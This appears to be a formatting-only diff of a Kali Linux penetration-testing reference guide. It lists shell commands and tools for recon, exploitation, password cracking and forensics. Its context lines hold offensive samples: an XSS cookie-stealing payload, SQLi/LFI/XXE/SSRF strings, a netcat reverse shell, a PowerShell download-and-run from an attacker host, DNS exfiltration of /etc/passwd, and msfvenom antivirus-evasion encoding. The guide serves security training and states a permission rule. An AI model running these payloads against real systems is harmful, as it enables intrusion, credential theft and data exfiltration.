@@ -1,4 +1,4 @@
-﻿---
+---
 seoTitle: Kali Linux Complete Guide – Penetration Testing, Tools & Commands
 description: "Comprehensive Kali Linux reference covering installation, Linux fundamentals, shell commands, networking, user management, penetration testing tools, Metasploit, Nmap, Wireshark, Burp Suite, and ethical hacking workflows."
 keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, Wireshark, Burp Suite, wireless security, security tools, cybersecurity, Linux commands, kali linux tutorial, kali linux guide, kali linux notes, VR-Rathod, Code-Note, code note vr, vr book"
@@ -18,7 +18,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		- BackTrack had architectural limitations and was hard to maintain.
 		- Goal: FHS-compliant, properly packaged, enterprise-grade free platform for security professionals.
 		- Used by: pentesters, CTF players, security researchers, law enforcement, students.
-
+-
 - # Introduction
   collapsed:: true
 	- ## What is Kali Linux?
@@ -37,7 +37,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  Kali Linux Cloud       → AWS, Azure, GCP images
 		  Kali Linux Undercover  → Looks like Windows 10
 		  ```
-
+-
 - # Installation & Setup
   collapsed:: true
 	- ## System Requirements
@@ -65,7 +65,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  5. passwd root → enter new password
 		  6. exec /sbin/init
 		  ```
-
+-
 - # Kernel & Architecture
   collapsed:: true
 	- ## What is the Kernel?
@@ -125,7 +125,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  s  Socket             (IPC network communication)
 		  p  Named pipe (FIFO)  (IPC between processes)
 		  ```
-
+-
 - # Shell & Terminal
   collapsed:: true
 	- ## Shell Types
@@ -169,7 +169,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		- ```
 		  Format: -rwxrwxrwx  (owner group others)
 		  r=4  w=2  x=1   →  7=rwx  6=rw-  5=r-x  4=r--  0=---
-
+		  
 		  chmod 755 script.sh    # owner:rwx group:r-x others:r-x
 		  chmod 644 file.txt     # owner:rw- group:r-- others:r--
 		  chmod 600 id_rsa       # owner:rw- only (SSH key)
@@ -240,21 +240,21 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  name="Kali"
 		  echo "Hello, $name"
 		  read -p "Enter name: " username
-
+		  
 		  if [ $age -ge 18 ]; then echo "Adult"
 		  elif [ $age -ge 13 ]; then echo "Teen"
 		  else echo "Child"; fi
-
+		  
 		  for i in {1..5}; do echo $i; done
-
+		  
 		  while [ $count -lt 10 ]; do echo $count; ((count++)); done
-
+		  
 		  greet() { echo "Hello, $1"; }
 		  greet "World"
-
+		  
 		  command; if [ $? -eq 0 ]; then echo "OK"; else echo "Fail"; fi
 		  ```
-
+-
 - # Process Management
   collapsed:: true
 	- ## Viewing & Controlling Processes
@@ -290,7 +290,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  cat /proc/meminfo      # detailed memory
 		  dmidecode              # hardware info from BIOS
 		  ```
-
+-
 - # Systemd & Service Management
   collapsed:: true
 	- ## systemctl
@@ -319,14 +319,14 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  /var/log/dpkg.log      → package install history
 		  /var/log/apache2/      → web server logs
 		  /var/log/fail2ban.log  → blocked IPs
-
+		  
 		  grep "Failed password" /var/log/auth.log   # failed SSH
 		  grep "Accepted" /var/log/auth.log           # successful SSH
 		  last                   # login history
 		  lastb                  # failed login attempts
 		  lastlog                # last login all users
 		  ```
-
+-
 - # User & Group Management
   collapsed:: true
 	- ## User Commands
@@ -360,7 +360,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  gpasswd -d user group          # remove from group
 		  groups username                # show user's groups
 		  ```
-
+-
 - # Package Management
   collapsed:: true
 	- ## APT Commands
@@ -391,7 +391,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  kali-tools-sniffing-spoofing    sniffing
 		  kali-tools-social-engineering   SET etc
 		  ```
-
+-
 - # Disk & Storage Management
   collapsed:: true
 	- ## Disk Info & Partitioning
@@ -422,7 +422,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile
 		  echo '/swapfile none swap sw 0 0' >> /etc/fstab
 		  ```
-
+-
 - # Networking
   collapsed:: true
 	- ## Network Info
@@ -476,7 +476,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  ufw enable / ufw status
 		  ufw allow 22 / ufw allow 80/tcp / ufw deny 23
 		  ```
-
+-
 - # Penetration Testing Methodology
   collapsed:: true
 	- ## Phases
@@ -489,7 +489,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  ```
 	- ## Legal Rules
 		- NEVER test without written permission. Get signed Rules of Engagement. Stay in scope. Practice on VulnHub, HackTheBox, TryHackMe.
-
+-
 - # Information Gathering
   collapsed:: true
 	- ## Nmap
@@ -527,7 +527,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  # Recon-ng: web reconnaissance framework
 		  recon-ng                        # launch recon-ng
 		  ```
-
+-
 - # Service Enumeration
   collapsed:: true
 	- ## SMB / Samba
@@ -547,27 +547,27 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  nmap -p 21 --script ftp-anon target
 		  ftp target                     # anonymous: user=anonymous pass=email
 		  hydra -l admin -P rockyou.txt ftp://target
-
+		  
 		  # SNMP (UDP 161)
 		  nmap -sU -p 161 --script snmp-info,snmp-brute target
 		  snmpwalk -c public -v2c target
 		  onesixtyone -c community-strings.txt target
-
+		  
 		  # LDAP (port 389)
 		  nmap -p 389 --script ldap-search target
 		  ldapsearch -x -H ldap://target -b "dc=domain,dc=com"
-
+		  
 		  # NFS (port 2049)
 		  showmount -e target            # show NFS exports
 		  mount -t nfs target:/share /mnt/nfs
-
+		  
 		  # MySQL (3306) / MSSQL (1433)
 		  nmap -p 3306 --script mysql-info,mysql-enum target
 		  mysql -h target -u root -p
 		  nmap -p 1433 --script ms-sql-info target
 		  impacket-mssqlclient sa:password@target
 		  ```
-
+-
 - # Vulnerability Scanning
   collapsed:: true
 	- ## Nikto & OpenVAS
@@ -575,7 +575,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  nikto -h http://target.com                  # web server scan
 		  nikto -h http://target.com -ssl -p 8443     # HTTPS custom port
 		  nikto -h http://target.com -o report.html -Format html
-
+		  
 		  apt install gvm && gvm-setup && gvm-start   # OpenVAS setup
 		  # Web UI: https://127.0.0.1:9392
 		  ```
@@ -587,7 +587,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  searchsploit -m 12345          # copy to current dir
 		  searchsploit --update          # update database
 		  ```
-
+-
 - # Exploitation Tools
   collapsed:: true
 	- ## Metasploit Framework
@@ -602,7 +602,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  set LPORT 4444
 		  set PAYLOAD windows/x64/meterpreter/reverse_tcp
 		  check / run
-
+		  
 		  # Meterpreter post-exploitation
 		  sysinfo / getuid / getsystem   # info / user / privesc
 		  hashdump                       # dump password hashes
@@ -626,7 +626,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  # Encoded (AV evasion)
 		  msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe
 		  ```
-
+-
 - # Password Attacks
   collapsed:: true
 	- ## John the Ripper
@@ -660,7 +660,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
 		  cewl http://target.com -w wordlist.txt        # scrape site for words
 		  ```
-
+-
 - # Web Application Testing
   collapsed:: true
 	- ## Burp Suite
@@ -698,32 +698,32 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  SQL Injection:
 		    '  ''  ' OR 1=1--  admin'--  ' UNION SELECT NULL,NULL--
 		    Time-based: ' AND SLEEP(5)--
-
+		  
 		  XSS:
 		    <script>alert(1)</script>
 		    <img src=x onerror=alert(1)>
 		    <svg onload=alert(1)>
 		    Cookie steal: <script>document.location='http://attacker/?c='+document.cookie</script>
-
+		  
 		  LFI:
 		    ?page=../../../../etc/passwd
 		    ?page=php://filter/convert.base64-encode/resource=index.php
 		    Log poisoning: inject PHP in User-Agent → include log file
-
+		  
 		  Command Injection:
 		    ; id   | id   && id   `id`   $(id)
 		    Blind: ; sleep 5   ; ping -c5 attacker.com
-
+		  
 		  SSRF:
 		    url=http://127.0.0.1/
 		    url=http://169.254.169.254/latest/meta-data/  (AWS)
-
+		  
 		  XXE:
 		    <?xml version="1.0"?>
 		    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 		    <root>&xxe;</root>
 		  ```
-
+-
 - # Network Sniffing & Analysis
   collapsed:: true
 	- ## Wireshark
@@ -758,7 +758,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  # Victim nc:    nc attacker 4444 -e /bin/bash
 		  # File transfer: nc -lvp 4444 > file  |  nc host 4444 < file
 		  ```
-
+-
 - # Wireless Security
   collapsed:: true
 	- ## Aircrack-ng Suite
@@ -785,7 +785,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  # Configure hostapd-wpe.conf with SSID matching target
 		  hostapd-wpe hostapd-wpe.conf
 		  ```
-
+-
 - # Privilege Escalation
   collapsed:: true
 	- ## Linux PrivEsc
@@ -812,7 +812,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  # Automated: WinPEAS
 		  IEX(New-Object Net.WebClient).downloadString('http://attacker/winPEAS.ps1')
 		  ```
-
+-
 - # Post-Exploitation & Persistence
   collapsed:: true
 	- ## Linux Persistence
@@ -870,7 +870,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  # DNS exfil: encode data in DNS queries
 		  cat /etc/passwd | xxd -p | while read l; do dig $l.attacker.com; done
 		  ```
-
+-
 - # Forensics & Steganography
   collapsed:: true
 	- ## Disk Forensics
@@ -894,7 +894,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  exiftool -all= image.jpg           # strip all metadata
 		  zsteg image.png                    # detect hidden data in PNG
 		  ```
-
+-
 - # Reverse Engineering
   collapsed:: true
 	- ## Static Analysis
@@ -936,7 +936,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  VV                                 # visual graph mode
 		  iz                                 # strings in data section
 		  ```
-
+-
 - # Anonymity & Evasion
   collapsed:: true
 	- ## Tor & Proxychains
@@ -974,7 +974,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  apt install shellter && shellter
 		  # Check detection: https://antiscan.me (NOT VirusTotal for ops)
 		  ```
-
+-
 - # Cryptography Tools
   collapsed:: true
 	- ## Hash Identification
@@ -1002,7 +1002,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  gpg --decrypt file.txt.gpg > file.txt
 		  gpg --sign file.txt && gpg --verify file.txt.gpg
 		  ```
-
+-
 - # Social Engineering Tools
   collapsed:: true
 	- ## SET — Social Engineering Toolkit
@@ -1022,7 +1022,7 @@ keywords: "Kali Linux, penetration testing, ethical hacking, Metasploit, Nmap, W
 		  # Workflow: Sending Profile → Email Template → Landing Page → User Group → Launch Campaign
 		  # Tracks: opens, clicks, submitted credentials
 		  ```
-
+-
 - # More Learn
 	- ## Official Resources
 		- [Kali Linux Official Docs](https://www.kali.org/docs/)
